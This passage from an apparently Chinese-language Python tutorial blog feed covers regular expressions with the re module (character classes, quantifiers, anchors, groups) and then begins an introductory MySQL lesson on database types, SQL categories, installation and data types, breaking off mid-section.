href="#3-浅拷贝和深拷贝的区别" class="headerlink" title="3. 浅拷贝和深拷贝的区别"></a>3. 浅拷贝和深拷贝的区别</h3><ul><li>浅拷贝最多拷贝对象的一层</li><li>深拷贝可能拷贝对象的多层</li></ul><h2 id="五、正则表达式的概述"><a href="#五、正则表达式的概述" class="headerlink" title="五、正则表达式的概述"></a>五、正则表达式的概述</h2><h3 id="1-正则表达式的介绍"><a href="#1-正则表达式的介绍" class="headerlink" title="1. 正则表达式的介绍"></a>1. 正则表达式的介绍</h3><p>在实际开发过程中经常会有查找符合某些复杂规则的字符串的需要，比如:邮箱、图片地址、手机号码等，这时候想匹配或者查找符合某些规则的字符串就可以使用正则表达式了。</p><h3 id="2-正则表达式概念"><a href="#2-正则表达式概念" class="headerlink" title="2. 正则表达式概念"></a>2. 正则表达式概念</h3><p><strong>正则表达式就是记录文本规则的代码</strong></p><h3 id="3-正则表达式的样子"><a href="#3-正则表达式的样子" class="headerlink" title="3. 正则表达式的样子"></a>3. 正则表达式的样子</h3><p>0\d{2}-\d{8} 这个就是一个正则表达式，表达的意思是匹配的是座机号码</p><h3 id="4-正则表达式的特点"><a href="#4-正则表达式的特点" class="headerlink" title="4. 正则表达式的特点"></a>4. 正则表达式的特点</h3><ul><li>正则表达式的语法很令人头疼，可读性差</li><li>正则表达式通用行很强，能够适用于很多编程语言</li></ul><h3 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h3><ul><li>正则表达式是匹配符合某些规则的字符串数据</li><li></li></ul><h2 id="六、re模块介绍"><a href="#六、re模块介绍" class="headerlink" title="六、re模块介绍"></a>六、re模块介绍</h2><h1 id="re模块介绍"><a href="#re模块介绍" class="headerlink" title="re模块介绍"></a>re模块介绍</h1><p><strong>学习目标</strong></p><ul><li>能够知道在python中使用正则表达式需要导入的模块</li></ul><hr><h3 id="1-re模块的介绍"><a href="#1-re模块的介绍" class="headerlink" title="1. re模块的介绍"></a>1. re模块的介绍</h3><p>在Python中需要通过正则表达式对字符串进行匹配的时候，可以使用一个 re 模块</p><pre><code class="python"># 导入re模块import re# 使用match方法进行匹配操作result = re.match(正则表达式,要匹配的字符串)# 如果上一步匹配到数据的话，可以使用group方法来提取数据result.group()</code></pre><h3 id="2-re模块的使用"><a href="#2-re模块的使用" class="headerlink" title="2. re模块的使用"></a>2. re模块的使用</h3><pre><code class="python">import re# 使用match方法进行匹配操作result = re.match(&quot;itcast&quot;,&quot;itcast.cn&quot;)# 获取匹配结果info = result.group()print(info)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">itcast</code></pre><h3 id="3-小结"><a href="#3-小结" class="headerlink" title="3. 小结"></a>3. 小结</h3><ul><li>re.match() 根据正则表达式从头开始匹配字符串数据</li></ul><h2 id="七、匹配单个字符"><a href="#七、匹配单个字符" class="headerlink" title="七、匹配单个字符"></a>七、匹配单个字符</h2><h1 id="匹配单个字符"><a href="#匹配单个字符" class="headerlink" title="匹配单个字符"></a>匹配单个字符</h1><p><strong>学习目标</strong></p><ul><li>能够使用re模块匹配单个字符</li></ul><hr><h3 id="1-匹配单个字符"><a href="#1-匹配单个字符" class="headerlink" title="1. 匹配单个字符"></a>1. 匹配单个字符</h3><p>在上一小节中，了解到通过re模块能够完成使用正则表达式来匹配字符串</p><p>本小节，将要讲解正则表达式的单字符匹配</p><table><thead><tr><th align="center">代码</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">.</td><td align="left">匹配任意1个字符（除了\n）</td></tr><tr><td align="center">[ ]</td><td align="left">匹配[ ]中列举的字符</td></tr><tr><td align="center">\d</td><td align="left">匹配数字，即0-9</td></tr><tr><td align="center">\D</td><td align="left">匹配非数字，即不是数字</td></tr><tr><td align="center">\s</td><td align="left">匹配空白，即 空格，tab键</td></tr><tr><td align="center">\S</td><td align="left">匹配非空白</td></tr><tr><td align="center">\w</td><td align="left">匹配非特殊字符，即a-z、A-Z、0-9、_、汉字</td></tr><tr><td align="center">\W</td><td align="left">匹配特殊字符，即非字母、非数字、非汉字</td></tr></tbody></table><h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1： ."></a>示例1： .</h3><pre><code class="python">import reret = re.match(&quot;.&quot;,&quot;M&quot;)print(ret.group())ret = re.match(&quot;t.o&quot;,&quot;too&quot;)print(ret.group())ret = re.match(&quot;t.o&quot;,&quot;two&quot;)print(ret.group())</code></pre><p>运行结果：</p><pre><code class="python">Mtootwo</code></pre><h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2：[ ]"></a>示例2：[ ]</h3><pre><code class="python">import re# 如果hello的首字符小写，那么正则表达式需要小写的hret = re.match(&quot;h&quot;,&quot;hello Python&quot;) print(ret.group())# 如果hello的首字符大写，那么正则表达式需要大写的Hret = re.match(&quot;H&quot;,&quot;Hello Python&quot;) print(ret.group())# 大小写h都可以的情况ret = re.match(&quot;[hH]&quot;,&quot;hello Python&quot;)print(ret.group())ret = re.match(&quot;[hH]&quot;,&quot;Hello Python&quot;)print(ret.group())ret = re.match(&quot;[hH]ello Python&quot;,&quot;Hello Python&quot;)print(ret.group())# 匹配0到9第一种写法ret = re.match(&quot;[0123456789]Hello Python&quot;,&quot;7Hello Python&quot;)print(ret.group())# 匹配0到9第二种写法ret = re.match(&quot;[0-9]Hello Python&quot;,&quot;7Hello Python&quot;)print(ret.group())ret = re.match(&quot;[0-35-9]Hello Python&quot;,&quot;7Hello Python&quot;)print(ret.group())# 下面这个正则不能够匹配到数字4，因此ret为Noneret = re.match(&quot;[0-35-9]Hello Python&quot;,&quot;4Hello Python&quot;)# print(ret.group())</code></pre><p>运行结果：</p><pre><code class="python">hHhHHello Python7Hello Python7Hello Python7Hello Python</code></pre><h3 id="示例3：-d"><a href="#示例3：-d" class="headerlink" title="示例3：\d"></a>示例3：\d</h3><pre><code class="python">import re# 普通的匹配方式ret = re.match(&quot;嫦娥1号&quot;,&quot;嫦娥1号发射成功&quot;) print(ret.group())ret = re.match(&quot;嫦娥2号&quot;,&quot;嫦娥2号发射成功&quot;) print(ret.group())ret = re.match(&quot;嫦娥3号&quot;,&quot;嫦娥3号发射成功&quot;) print(ret.group())# 使用\d进行匹配ret = re.match(&quot;嫦娥\d号&quot;,&quot;嫦娥1号发射成功&quot;) print(ret.group())ret = re.match(&quot;嫦娥\d号&quot;,&quot;嫦娥2号发射成功&quot;) print(ret.group())ret = re.match(&quot;嫦娥\d号&quot;,&quot;嫦娥3号发射成功&quot;) print(ret.group())</code></pre><p>运行结果：</p><pre><code class="python">嫦娥1号嫦娥2号嫦娥3号嫦娥1号嫦娥2号嫦娥3号</code></pre><h3 id="示例4：-D"><a href="#示例4：-D" class="headerlink" title="示例4：\D"></a>示例4：\D</h3><pre><code class="python">import rematch_obj = re.match(&quot;\D&quot;, &quot;f&quot;)if match_obj:    # 获取匹配结果    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果:</p><pre><code class="python">f</code></pre><h3 id="示例5：-s"><a href="#示例5：-s" class="headerlink" title="示例5：\s"></a>示例5：\s</h3><pre><code class="python">import re# 空格属于空白字符match_obj = re.match(&quot;hello\sworld&quot;, &quot;hello world&quot;)if match_obj:    result = match_obj.group()    print(result)else:    print(&quot;匹配失败&quot;)# \t 属于空白字符match_obj = re.match(&quot;hello\sworld&quot;, &quot;hello\tworld&quot;)if match_obj:    result = match_obj.group()    print(result)else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果:</p><pre><code class="python">hello worldhello world</code></pre><h3 id="示例6：-S"><a href="#示例6：-S" class="headerlink" title="示例6：\S"></a>示例6：\S</h3><pre><code class="python">import rematch_obj = re.match(&quot;hello\Sworld&quot;, &quot;hello&amp;world&quot;)if match_obj:result = match_obj.group()print(result)else:print(&quot;匹配失败&quot;)match_obj = re.match(&quot;hello\Sworld&quot;, &quot;hello$world&quot;)if match_obj:result = match_obj.group()print(result)else:print(&quot;匹配失败&quot;)</code></pre><p>运行结果:</p><pre><code class="python">hello&amp;world  hello$world</code></pre><h3 id="示例7：-w"><a href="#示例7：-w" class="headerlink" title="示例7：\w"></a>示例7：\w</h3><pre><code class="python">import re# 匹配非特殊字符中的一位match_obj = re.match(&quot;\w&quot;, &quot;A&quot;)if match_obj:    # 获取匹配结果    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>执行结果:</p><pre><code>A</code></pre><h3 id="示例8：-W"><a href="#示例8：-W" class="headerlink" title="示例8：\W"></a>示例8：\W</h3><pre><code class="python"># 匹配特殊字符中的一位match_obj = re.match(&quot;\W&quot;, &quot;&amp;&quot;)if match_obj:    # 获取匹配结果    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>执行结果:</p><pre><code>&amp;</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>. 表示匹配任意1个字符（除了\n）</li><li><input disabled="" type="checkbox"> 表示匹配[ ]中列举的1个字符</li><li>\d 表示匹配一个数字，即0-9</li><li>\D 表示匹配一个非数字，即不是数字</li><li>\s 表示匹配一个空白字符，即 空格，tab键</li><li>\S | 匹配一个非空白字符</li><li>\w | 匹配一个非特殊字符，即a-z、A-Z、0-9、_、汉字</li><li>\W | 匹配一个特殊字符，即非字母、非数字、非汉字</li></ul><h2 id="八、匹配多个字符"><a href="#八、匹配多个字符" class="headerlink" title="八、匹配多个字符"></a>八、匹配多个字符</h2><h3 id="1-匹配多个字符"><a href="#1-匹配多个字符" class="headerlink" title="1. 匹配多个字符"></a>1. 匹配多个字符</h3><table><thead><tr><th align="center">代码</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">*</td><td align="left">匹配前一个字符出现0次或者无限次，即可有可无</td></tr><tr><td align="center">+</td><td align="left">匹配前一个字符出现1次或者无限次，即至少有1次</td></tr><tr><td align="center">?</td><td align="left">匹配前一个字符出现1次或者0次，即要么有1次，要么没有</td></tr><tr><td align="center">{m}</td><td align="left">匹配前一个字符出现m次</td></tr><tr><td align="center">{m,n}</td><td align="left">匹配前一个字符出现从m到n次</td></tr></tbody></table><h3 id="示例1：-1"><a href="#示例1：-1" class="headerlink" title="示例1：*"></a>示例1：*</h3><p>需求：匹配出一个字符串第一个字母为大小字符，后面都是小写字母并且这些小写字母可 有可无</p><pre><code class="python">import reret = re.match(&quot;[A-Z][a-z]*&quot;,&quot;M&quot;)print(ret.group())ret = re.match(&quot;[A-Z][a-z]*&quot;,&quot;MnnM&quot;)print(ret.group())ret = re.match(&quot;[A-Z][a-z]*&quot;,&quot;Aabcdef&quot;)print(ret.group())</code></pre><p>运行结果：</p><pre><code class="python">MMnnAabcdef</code></pre><h3 id="示例2：-1"><a href="#示例2：-1" class="headerlink" title="示例2：+"></a>示例2：+</h3><p>需求：匹配一个字符串，第一个字符是t,最后一个字符串是o,中间至少有一个字符</p><pre><code class="python">import rematch_obj = re.match(&quot;t.+o&quot;, &quot;two&quot;)if match_obj:    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果：</p><pre><code class="python">two</code></pre><h3 id="示例3："><a href="#示例3：" class="headerlink" title="示例3：?"></a>示例3：?</h3><p>需求：匹配出这样的数据，但是https 这个s可能有，也可能是http 这个s没有</p><pre><code class="python">import rematch_obj = re.match(&quot;https?&quot;, &quot;http&quot;)if match_obj:    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果：</p><pre><code class="python">https</code></pre><h3 id="示例4：-m-、-m-n"><a href="#示例4：-m-、-m-n" class="headerlink" title="示例4：{m}、{m,n}"></a>示例4：{m}、{m,n}</h3><p>需求：匹配出，8到20位的密码，可以是大小写英文字母、数字、下划线</p><pre><code class="python">import reret = re.match(&quot;[a-zA-Z0-9_]{6}&quot;,&quot;12a3g45678&quot;)print(ret.group())ret = re.match(&quot;[a-zA-Z0-9_]{8,20}&quot;,&quot;1ad12f23s34455ff66&quot;)print(ret.group())</code></pre><p>运行结果：</p><pre><code class="python">12a3g41ad12f23s34455ff66</code></pre><h3 id="2-小结"><a href="#2-小结" class="headerlink" title="2. 小结"></a>2. 小结</h3><ul><li>*表示匹配前一个字符出现0次或者无限次，即可有可无</li><li>+表示匹配前一个字符出现1次或者无限次，即至少有1次</li><li>?表示匹配前一个字符出现1次或者0次，即要么有1次，要么没有</li><li>{m}表示匹配前一个字符出现m次</li><li>{m,n}表示匹配前一个字符出现从m到n次</li><li></li></ul><h2 id="九、匹配开头和结尾"><a href="#九、匹配开头和结尾" class="headerlink" title="九、匹配开头和结尾"></a>九、匹配开头和结尾</h2><h3 id="1-匹配开头和结尾"><a href="#1-匹配开头和结尾" class="headerlink" title="1. 匹配开头和结尾"></a>1. 匹配开头和结尾</h3><table><thead><tr><th align="center">代码</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">^</td><td align="left">匹配字符串开头</td></tr><tr><td align="center">$</td><td align="left">匹配字符串结尾</td></tr></tbody></table><h3 id="示例1：-2"><a href="#示例1：-2" class="headerlink" title="示例1：^"></a>示例1：^</h3><p>需求：匹配以数字开头的数据</p><pre><code class="python">import re# 匹配以数字开头的数据match_obj = re.match(&quot;^\d.*&quot;, &quot;3hello&quot;)if match_obj:    # 获取匹配结果    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果:</p><pre><code class="python">3hello</code></pre><h3 id="示例2：-2"><a href="#示例2：-2" class="headerlink" title="示例2：$"></a>示例2：$</h3><p>需求: 匹配以数字结尾的数据</p><pre><code class="python">import re# 匹配以数字结尾的数据match_obj = re.match(&quot;.*\d$&quot;, &quot;hello5&quot;)if match_obj:    # 获取匹配结果    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果：</p><pre><code class="python">hello5</code></pre><h3 id="示例3：-和"><a href="#示例3：-和" class="headerlink" title="示例3：^ 和 $"></a>示例3：^ 和 $</h3><p>需求: 匹配以数字开头中间内容不管以数字结尾</p><pre><code class="python">match_obj = re.match(&quot;^\d.*\d$&quot;, &quot;4hello4&quot;)if match_obj:    # 获取匹配结果    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果:</p><pre><code class="python">4hello4</code></pre><h3 id="2-除了指定字符以外都匹配"><a href="#2-除了指定字符以外都匹配" class="headerlink" title="2.除了指定字符以外都匹配"></a>2.除了指定字符以外都匹配</h3><p>需求: 第一个字符除了aeiou的字符都匹配</p><pre><code class="python">import rematch_obj = re.match(&quot;[^aeiou]&quot;, &quot;h&quot;)if match_obj:    # 获取匹配结果    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>执行结果</p><pre><code>h</code></pre><h3 id="3-小结-1"><a href="#3-小结-1" class="headerlink" title="3. 小结"></a>3. 小结</h3><ul><li>^ 表示匹配字符串开头</li><li>$ 表示匹配字符串结尾</li></ul><h2 id="十、匹配分组"><a href="#十、匹配分组" class="headerlink" title="十、匹配分组"></a>十、匹配分组</h2><h3 id="1-匹配分组相关正则表达式"><a href="#1-匹配分组相关正则表达式" class="headerlink" title="1. 匹配分组相关正则表达式"></a>1. 匹配分组相关正则表达式</h3><table><thead><tr><th align="center">代码</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">|</td><td align="left">匹配左右任意一个表达式</td></tr><tr><td align="center">(ab)</td><td align="left">将括号中字符作为一个分组</td></tr><tr><td align="center"><code>\num</code></td><td align="left">引用分组num匹配到的字符串</td></tr><tr><td align="center"><code>(?P&lt;name&gt;)</code></td><td align="left">分组起别名</td></tr><tr><td align="center">(?P=name)</td><td align="left">引用别名为name分组匹配到的字符串</td></tr></tbody></table><h3 id="示例1：-3"><a href="#示例1：-3" class="headerlink" title="示例1：|"></a>示例1：|</h3><p>需求：在列表中[“apple”, “banana”, “orange”, “pear”]，匹配apple和pear</p><pre><code class="python">import re# 水果列表fruit_list = [&quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;, &quot;pear&quot;]# 遍历数据for value in fruit_list:    # |    匹配左右任意一个表达式    match_obj = re.match(&quot;apple|pear&quot;, value)    if match_obj:        print(&quot;%s是我想要的&quot; % match_obj.group())    else:        print(&quot;%s不是我要的&quot; % value)</code></pre><p>执行结果:</p><pre><code class="python">apple是我想要的banana不是我要的orange不是我要的pear是我想要的</code></pre><h3 id="示例2：-3"><a href="#示例2：-3" class="headerlink" title="示例2：( )"></a>示例2：( )</h3><p>需求：匹配出163、126、qq等邮箱</p><pre><code class="python">import rematch_obj = re.match(&quot;[a-zA-Z0-9_]{4,20}@(163|126|qq|sina|yahoo)\.com&quot;, &quot;hello@163.com&quot;)if match_obj:    print(match_obj.group())    # 获取分组数据    print(match_obj.group(1))else:    print(&quot;匹配失败&quot;)</code></pre><p>执行结果:</p><pre><code>hello@163.com163</code></pre><p>需求: 匹配qq:10567这样的数据，提取出来qq文字和qq号码</p><pre><code class="python">import rematch_obj = re.match(&quot;(qq):([1-9]\d{4,10})&quot;, &quot;qq:10567&quot;)if match_obj:    print(match_obj.group())    # 分组:默认是1一个分组，多个分组从左到右依次加1    print(match_obj.group(1))    # 提取第二个分组数据    print(match_obj.group(2))else:    print(&quot;匹配失败&quot;)</code></pre><p>执行结果:</p><pre><code>qq10567</code></pre><h3 id="示例3：-num"><a href="#示例3：-num" class="headerlink" title="示例3：\num"></a>示例3：\num</h3><p>需求：匹配出<code>&lt;html&gt;hh&lt;/html&gt;</code></p><pre><code class="python">match_obj = re.match(&quot;&lt;[a-zA-Z1-6]+&gt;.*&lt;/[a-zA-Z1-6]+&gt;&quot;, &quot;&lt;html&gt;hh&lt;/div&gt;&quot;)if match_obj:    print(match_obj.group())else:    print(&quot;匹配失败&quot;)match_obj = re.match(&quot;&lt;([a-zA-Z1-6]+)&gt;.*&lt;/\\1&gt;&quot;, &quot;&lt;html&gt;hh&lt;/html&gt;&quot;)if match_obj:    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果：</p><pre><code class="html">&lt;html&gt;hh&lt;/div&gt;&lt;html&gt;hh&lt;/html&gt;</code></pre><p>需求：匹配出<code>&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;</code></p><pre><code class="python">match_obj = re.match(&quot;&lt;([a-zA-Z1-6]+)&gt;&lt;([a-zA-Z1-6]+)&gt;.*&lt;/\\2&gt;&lt;/\\1&gt;&quot;, &quot;&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;&quot;)if match_obj:    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果：</p><pre><code class="html">&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;</code></pre><h3 id="示例4：-P-lt-name-gt-P-name"><a href="#示例4：-P-lt-name-gt-P-name" class="headerlink" title="示例4：(?P&lt;name&gt;) (?P=name)"></a>示例4：<code>(?P&lt;name&gt;)</code> <code>(?P=name)</code></h3><p>需求：匹配出<code>&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;</code></p><pre><code class="python">match_obj = re.match(&quot;&lt;(?P&lt;name1&gt;[a-zA-Z1-6]+)&gt;&lt;(?P&lt;name2&gt;[a-zA-Z1-6]+)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;&quot;, &quot;&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;&quot;)if match_obj:    print(match_obj.group())else:    print(&quot;匹配失败&quot;)</code></pre><p>运行结果：</p><pre><code class="html">&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;</code></pre><h3 id="2-小结-1"><a href="#2-小结-1" class="headerlink" title="2. 小结"></a>2. 小结</h3><ul><li>| 表示匹配左右任意一个表达式</li><li>(ab) 表示将括号中字符作为一个分组</li><li><code>\num</code> 表示引用分组num匹配到的字符串</li><li><code>(?P&lt;name&gt;)</code> 表示分组起别名</li><li>(?P=name) 表示引用别名为name分组匹配到的字符串</li><li>(分组数据)：分组数是从左到右的方式进行分配的，最左边的是第一个分组，依次类推</li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级08-MySQL数据库</title>
      <link href="/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A708-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93(%E6%8F%92%E5%9B%BE%E7%89%88)/"/>
      <url>/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A708-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93(%E6%8F%92%E5%9B%BE%E7%89%88)/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h1><h2 id="一、MySQL数据库的基本使用"><a href="#一、MySQL数据库的基本使用" class="headerlink" title="一、MySQL数据库的基本使用"></a>一、MySQL数据库的基本使用</h2><h3 id="1-数据库"><a href="#1-数据库" class="headerlink" title="1.数据库"></a>1.数据库</h3><a id="more"></a><h4 id="1-1-数据库的介绍"><a href="#1-1-数据库的介绍" class="headerlink" title="1.1 数据库的介绍"></a>1.1 数据库的介绍</h4><p>数据库就是<strong>存储和管理数据的仓库</strong>，数据按照一定的格式进行存储，用户可以对数据库中的数据进行增加、修改、删除、查询等操作。</p><h4 id="1-2-数据库的分类"><a href="#1-2-数据库的分类" class="headerlink" title="1.2 数据库的分类"></a>1.2 数据库的分类</h4><ul><li>关系型数据库</li><li>非关系型数据库</li></ul><p><strong>关系型数据库:</strong></p><p>是指采用了关系模型来组织数据的数据库，简单来说，<strong>关系模型指的就是二维表格模型</strong>，好比Excel文件中的表格，强调使用表格的方式存储数据。</p><p><strong>关系型数据库中核心元素</strong></p><ul><li>数据行</li><li>数据列</li><li>数据表</li><li>数据库(数据表的集合)</li></ul><p><strong>常用的关系型数据库:</strong></p><ul><li>Oracle</li><li>Microsoft SQL Server</li><li>MySQL</li><li>SQLite</li></ul><p><strong>非关系型数据库:</strong></p><p>非关系型数据库，又被称为NoSQL（Not Only SQL )，意为不仅仅是SQL，对NoSQL 最普遍的定义是“非关联型的”，强调 Key-Value 的方式存储数据。</p><p><strong>常用的非关系型数据库:</strong></p><ul><li>MongoDB</li><li>Redis</li></ul><h4 id="1-3-数据库的作用"><a href="#1-3-数据库的作用" class="headerlink" title="1.3 数据库的作用"></a>1.3 数据库的作用</h4><p>数据库的作用就是存储和管理数据的，比如: 我们在京东网站上的浏览的商品列表数据，这些数据都会存储在数据库。</p><h4 id="1-4-数据库的特点"><a href="#1-4-数据库的特点" class="headerlink" title="1.4 数据库的特点"></a>1.4 数据库的特点</h4><ol><li>持久化存储</li><li>读写速度极高</li><li>保证数据的有效性</li></ol><h3 id="2-关系型数据库管理系统"><a href="#2-关系型数据库管理系统" class="headerlink" title="2.关系型数据库管理系统"></a>2.关系型数据库管理系统</h3><h4 id="2-1-关系型数据库管理系统的介绍"><a href="#2-1-关系型数据库管理系统的介绍" class="headerlink" title="2.1 关系型数据库管理系统的介绍"></a>2.1 关系型数据库管理系统的介绍</h4><p>数据库管理系统（英语全拼：Relational Database Management System，简称RDBMS）是<strong>为管理关系型数据库而设计的软件系统，如果大家想要使用关系型数据库就需要安装数据库管理系统，其实就是一个应用软件</strong>。</p><p><strong>关系型数据库管理系统可以分为:</strong></p><ul><li>关系型数据库服务端软件</li><li>关系型数据库客户端软件</li></ul><p><strong>关系型数据库服务端软件:</strong></p><p>主要负责管理不同的数据库，而每个数据库里面会有一系列数据文件，数据文件是用来存储数据的, 其实数据库就是一系列数据文件的集合。</p><p><strong>关系型数据库客户端软件:</strong></p><p>主要负责和关系型数据库服务端软件进行通信, 向服务端传输数据或者从服务端获取数据.</p><p><strong>说明:</strong></p><ol><li>用户操作关系型数据库客户端，实现数据库相关操作。</li><li>关系数据库客户端借助网络使用SQL语言和关系型数据库服务端进行数据通信</li><li>关系型数据库服务端管理着不同的数据库，每个数据库会有一系列的数据文件，数据都保存在数据文件里面，每个数据库可以理解成是一个文件夹。</li><li>数据库客户端和数据库服务器想要通信需要使用SQL。</li></ol><h4 id="2-2-SQL的介绍"><a href="#2-2-SQL的介绍" class="headerlink" title="2.2 SQL的介绍"></a>2.2 SQL的介绍</h4><p>SQL(Structured Query Language)是结构化查询语言，是一种用来操作RDBMS的数据库的语言。也就是说通过 SQL 可以操作 oracle,sql server,mysql,sqlite 等关系型的数据库。</p><p>SQL的作用是实现数据库客户端和数据库服务端之间的通信，SQL就是通信的桥梁。</p><p><strong>SQL语言主要分为：</strong></p><ul><li><strong>DQL：数据查询语言，用于对数据进行查询，如select</strong></li><li><strong>DML：数据操作语言，对数据进行增加、修改、删除，如insert、update、delete</strong></li><li>TPL：事务处理语言，对事务进行处理，包括begin transaction、commit、rollback</li><li>DCL：数据控制语言，进行授权与权限回收，如grant、revoke</li><li>DDL：数据定义语言，进行数据库、表的管理等，如create、drop</li></ul><p><strong>说明:</strong></p><ul><li>对于程序员来讲，重点是数据的增、删、改、查，必须熟练编写DQL、DML，能够编写DDL完成数据库、表的操作，其它操作如TPL、DCL了解即可.</li><li>SQL语言不区分大小写</li></ul><p>​    </p><h3 id="3-MySQL数据库"><a href="#3-MySQL数据库" class="headerlink" title="3.MySQL数据库"></a>3.MySQL数据库</h3><h4 id="3-1-MySQL数据库的介绍"><a href="#3-1-MySQL数据库的介绍" class="headerlink" title="3.1 MySQL数据库的介绍"></a>3.1 MySQL数据库的介绍</h4><p>MySQL是一个关系型数据库管理系统，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件，它是由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品，MySQL 是最流行的关系型数据库管理系统中的一个。</p><p><strong>MySQL的特点:</strong></p><ol><li>MySQL是开源的，所以你不需要支付额外的费用。</li><li>MySQL支持大型的数据库。可以处理拥有上千万条记录的大型数据库。</li><li>MySQL使用标准的SQL数据语言形式。</li><li>MySQL可以安装在不同的操作系统，并且提供多种编程语言的操作接口。这些编程语言包括C、C++、Python、Java、Ruby等等。</li></ol><h4 id="3-2-MySQL数据库的安装"><a href="#3-2-MySQL数据库的安装" class="headerlink" title="3.2 MySQL数据库的安装"></a>3.2 MySQL数据库的安装</h4><ul><li>MySQL数据库服务端软件的安装</li><li>MySQL数据库客户端软件的安装</li></ul><p><strong>MySQL数据库服务端软件的安装:</strong></p><p>在Ubuntu中打开终端，输入下面的命令:</p><pre><code class="bash">sudo apt install mysql-server mysql-client</code></pre><p>manjaro安装mysql：</p><pre><code class="bash">sudo pacman -S mysql</code></pre><p>centos 安装mysql </p><pre><code class="bash">yum install mysql mysql-devel -y</code></pre><p><strong>查看MySQL服务状态:</strong></p><pre><code class="bash">sudo service mysql status</code></pre><p><strong>停止MySQL服务:</strong></p><pre><code class="bash">sudo service mysql stop</code></pre><p><strong>启动MySQL服务:</strong></p><pre><code class="bash">sudo service mysql start</code></pre><p><strong>重启MySQL服务:</strong></p><pre><code class="bash">sudo service mysql restart</code></pre><p><strong>MySQL配置文件的介绍:</strong>（ubutnu）</p><p>配置文件路径为: /etc/mysql/mysql.conf.d/mysqld.cnf</p><p><strong>主要配置信息说明:</strong></p><pre><code class="bash">port表示端口号，默认为3306bind-address表示服务器绑定的ip，默认为127.0.0.1datadir表示数据库保存路径，默认为/var/lib/mysqllog_error表示错误日志，默认为/var/log/mysql/error.log</code></pre><p><strong>MySQL数据库客户端软件的安装:</strong></p><p>客户端是程序员或者dba使用的软件，通过socket方式与服务端程序通信。</p><p>常用的MySQL数据库客户端软件有</p><ol><li>图形化界面客户端Navicat</li><li>命令行客户端mysql</li></ol><p><strong>mysql命令的使用帮助:</strong></p><pre><code class="bash">mysql --help</code></pre><p><strong>MySQL客户端的使用:</strong></p><p>MySQL客户端连接MySQL服务端命令</p><pre><code class="bash">mysql -uroot -p</code></pre><p><strong>说明:</strong></p><ul><li>-u: 表示MySQL服务端的用户名</li><li>-p: 表示MySQL服务端的密码</li><li>quit 或者 exit 或者 ctr + d 表示退出</li></ul><h3 id="4-数据类型和约束"><a href="#4-数据类型和约束" class="headerlink" title="4.数据类型和约束"></a>4.数据类型和约束</h3><h4 id="4-1-数据类型"><a href="#4-1-数据类型" class="headerlink" title="4.1 数据类型"></a>4.1 数据类型</h4><p>数据类型是指在创建表的时候为表中字段指定数据类型，只有数据符合类型要求才能存储起来，使用数据类型的原则是:够用就行，尽量使用取值范围小的，而不用大的，这样可以更多的节省存储空间。</p><p><strong>常用数据类型如下:</strong></p><ul><li>整数：int，bit</li><li>小数：decimal</li><li>字符串：varchar,char</li><li>日期时间: date, time, datetime</li><li>枚举类型(enum)</li></ul><p><strong>数据类型说明:</strong></p><ul><li>decimal表示浮点数，如 decimal(5, 2) 表示共存5位数，小数占 2 位.</li><li>char表示固定长度的字符串，如char(3)，如果填充’ab’时会补一个空格为’ab ‘，3表示字符数</li><li>varchar表示可变长度的字符串，如varchar(3)，填充’ab’时就会存储’ab’，3表示字符数</li><li>对于图片、音频、视频等文件，不存储在数据库中，而是上传到某个服务器上，然后在表中存储这个文件的保存路径.</li><li>字符串 text 表示存储大文本，当字符大于 4000 时推荐使用, 比如技术博客.</li></ul><h4 id="4-2-数据约束"><a href="#4-2-数据约束" class="headerlink" title="4.2 数据约束"></a>4.2 数据约束</h4><p>约束是指数据在数据类型限定的基础上额外增加的要求.</p><p><strong>常见的约束如下:</strong></p><ul><li>主键 primary key: 物理上存储的顺序. MySQL 建议所有表的主键字段都叫 id, 类型为 int unsigned.</li><li>非空 not null: 此字段不允许填写空值.</li><li>惟一 unique: 